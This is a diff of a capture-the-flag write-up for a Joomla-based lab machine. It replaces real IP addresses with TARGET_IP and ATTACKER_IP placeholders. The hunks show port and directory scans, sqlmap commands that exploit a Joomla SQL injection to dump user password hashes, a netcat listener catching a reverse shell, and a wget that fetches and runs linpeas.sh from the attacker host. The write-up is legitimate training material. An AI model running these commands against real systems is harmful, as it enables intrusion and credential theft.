@@ -19,13 +19,13 @@ $ sudo openvpn --config NovusEdge.ovpn
 ## Reconnaissance
 Time for some quick port scans and recon (god bless the creators of `rustscan`):
 ```shell-session
-$ rustscan -b 4500 -a 10.10.57.40 --ulimit 5000 -t 2000 -r 1-65535 -- -oN rustscan_port_scan.txt
+$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535 -- -oN rustscan_port_scan.txt
 PORT     STATE SERVICE REASON
 22/tcp   open  ssh     syn-ack
 80/tcp   open  http    syn-ack
 3306/tcp open  mysql   syn-ack
 
-$ rustscan -b 4500 -a 10.10.57.40 --ulimit 5000 -t 2000 -p22,80,3306 -- -sC -sV -oN rustscan_service_scan.txt
+$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p22,80,3306 -- -sC -sV -oN rustscan_service_scan.txt
 PORT     STATE SERVICE REASON  VERSION
 22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
 | ssh-hostkey: 
@@ -58,8 +58,8 @@ msf6 > search joomla
 ...
 
 msf6 > use 10
-msf6 auxiliary(scanner/http/joomla_version) > setg RHOSTS 10.10.57.40
-RHOSTS => 10.10.57.40
+msf6 auxiliary(scanner/http/joomla_version) > setg RHOSTS TARGET_IP
+RHOSTS => TARGET_IP
 msf6 auxiliary(scanner/http/joomla_version) > run
 
 [*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
@@ -86,22 +86,22 @@ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal
 
 Let's also do some directory enumeration while we're at it:
 ```shell-session
-$ gobuster dir -u http://10.10.57.40/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -o enum_gobuster.txt
-/media                (Status: 301) [Size: 233] [--> http://10.10.57.40/media/]
-/templates            (Status: 301) [Size: 237] [--> http://10.10.57.40/templates/]
-/images               (Status: 301) [Size: 234] [--> http://10.10.57.40/images/]
-/modules              (Status: 301) [Size: 235] [--> http://10.10.57.40/modules/]
-/bin                  (Status: 301) [Size: 231] [--> http://10.10.57.40/bin/]
-/plugins              (Status: 301) [Size: 235] [--> http://10.10.57.40/plugins/]
-/includes             (Status: 301) [Size: 236] [--> http://10.10.57.40/includes/]
-/language             (Status: 301) [Size: 236] [--> http://10.10.57.40/language/]
-/components           (Status: 301) [Size: 238] [--> http://10.10.57.40/components/]
-/cache                (Status: 301) [Size: 233] [--> http://10.10.57.40/cache/]
-/libraries            (Status: 301) [Size: 237] [--> http://10.10.57.40/libraries/]
-/tmp                  (Status: 301) [Size: 231] [--> http://10.10.57.40/tmp/]
-/layouts              (Status: 301) [Size: 235] [--> http://10.10.57.40/layouts/]
-/administrator        (Status: 301) [Size: 241] [--> http://10.10.57.40/administrator/]
-/cli                  (Status: 301) [Size: 231] [--> http://10.10.57.40/cli/]
+$ gobuster dir -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 -o enum_gobuster.txt
+/media                (Status: 301) [Size: 233] [--> http://TARGET_IP/media/]
+/templates            (Status: 301) [Size: 237] [--> http://TARGET_IP/templates/]
+/images               (Status: 301) [Size: 234] [--> http://TARGET_IP/images/]
+/modules              (Status: 301) [Size: 235] [--> http://TARGET_IP/modules/]
+/bin                  (Status: 301) [Size: 231] [--> http://TARGET_IP/bin/]
+/plugins              (Status: 301) [Size: 235] [--> http://TARGET_IP/plugins/]
+/includes             (Status: 301) [Size: 236] [--> http://TARGET_IP/includes/]
+/language             (Status: 301) [Size: 236] [--> http://TARGET_IP/language/]
+/components           (Status: 301) [Size: 238] [--> http://TARGET_IP/components/]
+/cache                (Status: 301) [Size: 233] [--> http://TARGET_IP/cache/]
+/libraries            (Status: 301) [Size: 237] [--> http://TARGET_IP/libraries/]
+/tmp                  (Status: 301) [Size: 231] [--> http://TARGET_IP/tmp/]
+/layouts              (Status: 301) [Size: 235] [--> http://TARGET_IP/layouts/]
+/administrator        (Status: 301) [Size: 241] [--> http://TARGET_IP/administrator/]
+/cli                  (Status: 301) [Size: 231] [--> http://TARGET_IP/cli/]
 ```
 Visiting the `/administrator` path, we're taken to the following page:
 ![](login-page.png)
@@ -124,12 +124,12 @@ $ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=mod
 
 By adding the `--tables` and `-D joomla` flags, we can specify that we wanna try and understand the tables of the database first, and what kind of database to attack.
 ```shell-session
-$ sqlmap -u "http://10.10.57.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --tables -p list[fullordering] -D joomla
+$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --tables -p list[fullordering] -D joomla
 ```
 
 This gives us a total of 72 tables to work with, most are not very useful, however, one of the ones we can use is the `__users` table:
 ```shell-session
-$ sqlmap -u "http://10.10.57.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --columns -p list[fullordering] -D joomla -T '#__users'
+$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs --columns -p list[fullordering] -D joomla -T '#__users'
 
 ...
 do you want to use common column existence check? [y/N/q] y
@@ -144,7 +144,7 @@ do you want to use common column existence check? [y/N/q] y
 
 Nice! Now let's try dumping the `username` and password columns:
 ```shell-session
-$ sqlmap -u "http://10.10.57.40/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump -C password
+$ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T '#__users' --dump -C password
 ...
 +----------+--------------------------------------------------------------+
 | username | password                                                     |
@@ -174,9 +174,9 @@ Starting a listener on our machine and accessing the payload we uploaded (`index
 
 ```shell-session
 $ nc -nvlp 4444
-# Try requesting 10.10.57.40/index.php/
+# Try requesting TARGET_IP/index.php/
 listening on [any] 4444 ...
-connect to [10.11.5.201] from (UNKNOWN) [10.10.57.40] 44852
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44852
 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  01:01:38 up  2:02,  0 users,  load average: 0.01, 0.03, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -228,7 +228,7 @@ REDHAT_SUPPORT_PRODUCT_VERSION="7"
 Let's try making use of `linpeas` to make things easier:
 ```shell-session
 # Getting the linpeas script from our machine...
-bash-4.2$ wget http://10.11.5.201:8080/linpeas.sh
+bash-4.2$ wget http://ATTACKER_IP:8080/linpeas.sh
 bash-4.2$ sh linpeas.sh 
 ...
 ╔══════════╣ Searching passwords in config PHP files
@@ -238,8 +238,8 @@ bash-4.2$ sh linpeas.sh
 
 Well, we have a password, let's pair that with the username `jjameson` (bruh, just `ls` the `/home` directory -\_-) and try logging into the machine using `ssh`:
 ```shell-session
-$ ssh jjameson@10.10.57.40
-jjameson@10.10.57.40's password: ...
+$ ssh jjameson@TARGET_IP
+jjameson@TARGET_IP's password: ...
 
 [jjameson@dailybugle ~]$ ls -la
 total 16
